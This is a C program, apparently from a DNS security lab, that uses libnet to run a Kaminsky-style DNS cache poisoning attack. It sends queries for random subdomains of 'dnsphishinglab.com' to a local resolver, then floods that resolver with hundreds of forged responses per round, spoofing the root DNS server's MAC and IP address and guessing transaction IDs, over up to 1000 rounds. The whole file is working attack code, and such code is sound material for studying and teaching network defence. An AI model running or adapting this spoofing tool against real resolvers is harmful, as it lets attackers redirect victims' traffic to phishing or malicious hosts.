#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>

    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];

    int payload_filesize = 0 ;
    char *payload_location ;
    
    u_long ip_source_address ;
    u_long ip_destination_address ;

	unsigned char* eth_saddr ;
	unsigned char* eth_daddr ;

    u_short t_src_port ;		/* source port */
    u_short t_des_port ;		/* dest port */
    unsigned int i_id = 57830 ;
    u_short i_frag = 0 ;


	char subdomain[100] ;



void define_query_payload()
{
	FILE* infile ;
	unsigned char random_id ;
	int iter, i = 0 ;
	unsigned char c ;
	unsigned char hex[3] ;
	int random_subdomain_num ;

// generate random subdomain- write to 'subdomain' variable
	random_subdomain_num = (random_subdomain_num + rand()) % 1000000000 ;
	sprintf(subdomain, "xyz%9i.dnsphishinglab.com\0", random_subdomain_num) ;

    payload_filesize = 2 + 10 + 1 +strlen(subdomain) + 5 ; // 4 bytes from end of Query Section
    if((payload_location = (char *)malloc(payload_filesize * sizeof(char))) == 0) printf("Allocation of memory for query payload failed.\n") ;

// Write Query ID to location. 16 bits = 2 bytes
	random_id = (random_id + rand()) % 255 ;
	*(payload_location + i) = (unsigned char)random_id ;
	i++ ;
	random_id = (random_id + rand()) % 255 ;
	*(payload_location + i) = (unsigned char)random_id ;
	i++ ;

// Write from file: Flags, Questions, Answer RRs, Authority RRs, Additional RRs = 10 bytes
	
	infile = fopen("query_payload\0", "r");	
	for(iter = i ; i < iter + 10; i++)
	{
		hex[0] = getc(infile) ;
		hex[1] = getc(infile) ;
		hex[2] = '\0' ;
		if(getc(infile) != '\n') printf("error in reading query_payload!\n") ;
		c = (unsigned char)strtol(hex, NULL, 16) ;
	        *(payload_location + i) = c;
	}
	fclose(infile) ;

// Write subdomain Query section in format:
//"(# bytes of sub in \x)" +"xyz1234.dnsphishinglab.com" + 0x00 + 0x00 + 0x01 + 0x00 + 0x01

	*(payload_location + i)	= (unsigned char)(strchr(subdomain, '.') - subdomain) ;
	i++ ;

	for(iter = i; i < iter + strlen(subdomain); i++) *(payload_location + i) = subdomain[i - iter] ;
	 
	unsigned char payload_tail[] = "\x00" "\x00" "\x01" "\x00" "\x01" ;
	for (iter = i; i < iter + 5; i++) *(payload_location + i) = payload_tail[i - iter] ;
}










void define_spoof_payload()
{
	FILE* infile ;
	unsigned char random_id ;
	int iter, i = 0;
	unsigned char c ;
	unsigned char hex[3] ;


// Write Query ID to location. 16 bits = 2 bytes
	random_id = (unsigned char)((random_id + rand()) % 255) ;
	*(payload_location + i) = (unsigned char)random_id ;
	i++ ;
	random_id = (unsigned char)((random_id + rand()) % 255) ;
	*(payload_location + i) = (unsigned char)random_id ;
	i++ ;


// Write from spoof_payload1 file = 10 bytes
	infile = fopen("spoof_payload1\0", "r") ;	
	for(iter = i ; i < iter + 10; i++)
	{
		hex[0] = getc(infile) ;
		hex[1] = getc(infile) ;
		hex[2] = '\0' ;
		if(getc(infile) != '\n') printf("error in reading spoof_payload1 !\n") ;
		c = (unsigned char)strtol(hex, NULL, 16) ;
	        *(payload_location + i) = c;
	}
	fclose(infile) ;

// # of chars in subdomain = 1 byte
	*(payload_location + i)	= (unsigned char)(strchr(subdomain, '.') - subdomain) ;
	i++ ;

// "xyz1234.dnsphishinglab.com" 
	for(iter = i; i < iter + strlen(subdomain); i++) *(payload_location + i) = subdomain[i - iter] ;

// Write from file spoof_payload2 file = 81 bytes
	infile = fopen("spoof_payload2\0", "r");	
	for(iter = i ; i < iter + 81 ; i++)
	{
		hex[0] = getc(infile) ;
		hex[1] = getc(infile) ;
		hex[2] = '\0' ;
		if(getc(infile) != '\n') printf("error in reading spoof_payload2 !\n") ;
		c = (unsigned char)strtol(hex, NULL, 16) ;
	        *(payload_location + i) = c;
	}
	fclose(infile) ;
}



int build(){

	t = libnet_build_udp(
	    t_src_port,                                /* source port */
	    t_des_port,                                /* destination port */
	    LIBNET_UDP_H + payload_filesize,           /* packet length */
	    0,                                         /* checksum */
	    payload_location,                          /* payload */
	    payload_filesize,                          /* payload size */
	    l,                                         /* libnet handle */
	    0);                                        /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
	return -1 ;
    }

	t = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
	0,                                            /* TOS */
        i_id,                                                  /* IP ID */
        i_frag,                                                /* IP Frag */
        64,                                                 /* TTL */
        IPPROTO_UDP,                                          /* protocol */
        0,                                                     /* checksum */
        ip_source_address,                                            /* source IP */
        ip_destination_address,                                            /* destination IP */
        NULL,                                                  /* payload */
        0,                                                     /* payload size */
	//payload_location,
	//payload_filesize,
        l,                                                     /* libnet handle */
        0);                                                    /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
	return -1 ;
    }

	t = libnet_build_ethernet(
        eth_daddr,                                   /* ethernet destination */
        eth_saddr,                                   /* ethernet source */
        ETHERTYPE_IP,                                 /* protocol type */
        NULL,                                        /* payload */
        0,                                           /* payload size */
//	payload_location,
//	payload_filesize,
        l,                                           /* libnet handle */
        0);                                          /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
	return -1 ;        
    }
}

void init_libnet(){

    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    "eth9\0",                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE);
    }

return ;

}









int main(int argc, char *argv[])
{
	int g, x ;
	unsigned char eth_addr_client []= "\x08" "\x00" "\x27" "\x27" "\xa3" "\xc0" ;
	unsigned char eth_addr_localDNS []= "\x08" "\x00" "\x27" "\xdc" "\x14" "\x96" ;
	unsigned char eth_addr_rootDNS []= "\x08" "\x00" "\x27" "\x2e" "\x88" "\x65" ;
	// 10msec/(34.883716 - 34.883607) = 91.7431 packets. packet # 9575 - packet # 9341 = 234 packets in 10 msecs
	//Therefore # of packets sent in 10 msec can range below ~234. Send more packets since delay may be longer.
	int pktcount = 300 ;


srand((int)time(0)) ;

for(g = 0; g < 1000; g++)
    {
//------------------------------------------------------------------------------
//---------------------------- Send Query Packet--------------------------------
//------------------------------------------------------------------------------

//Define packet parameters
	init_libnet() ;
	define_query_payload() ;
	eth_saddr = eth_addr_client ;
	eth_daddr = eth_addr_localDNS ;
	ip_source_address = libnet_name2addr4(l, "192.168.0.14", LIBNET_RESOLVE) ;
	ip_destination_address = libnet_name2addr4(l, "192.168.0.19", LIBNET_RESOLVE) ;
	t_src_port = 33333 ;		/* source port */
	t_des_port = 53 ;		/* dest port */

// Build and send
	if (build() == -1) printf("Packet Build Failed!\n") ;
	else libnet_write(l) ;	libnet_destroy(l) ;
	free(payload_location) ;
//------------------------------------------------------------------------------
//-----------------------------End Query Packet---------------------------------
//------------------------------------------------------------------------------






//-----------------------------------------------------------------------------------------------------
//----------- Send 'pktcount'(# of packets) spoofed response packets (spoof of Root DNS to local DNS)--
//-----------------------------------------------------------------------------------------------------
	
	eth_saddr = eth_addr_rootDNS ;
	eth_daddr = eth_addr_localDNS ;
	ip_source_address = libnet_name2addr4(l, "192.168.0.22", LIBNET_RESOLVE) ;
	ip_destination_address = libnet_name2addr4(l, "192.168.0.19", LIBNET_RESOLVE) ;
	t_src_port = 53 ;		// source port 
	t_des_port = 33333;		// dest port 

	
	payload_filesize = 2 + 10 + 1 + strlen(subdomain) + 81 ; // 4 bytes from end of Query Section
	if((payload_location = (char *)malloc(payload_filesize * sizeof(char))) == 0) printf("Allocation of memory for query payload failed.\n") ;
// Build and send	
	for (x = 0; x < pktcount; x++)
	{
		define_spoof_payload() ;
		init_libnet() ;	
		if (build() != -1) libnet_write(l) ; //libnet_write returns number of bytes sent
		else printf("Packet Build Failed!\n") ;
		libnet_destroy(l);
	}
	free(payload_location) ;
//------------------------------------------------------------------------------------------------
//-------------------------------End Spoofed response packets-------------------------------------
//------------------------------------------------------------------------------------------------


    }		// Restart attack iteration if needed

	return (EXIT_SUCCESS) ;
}


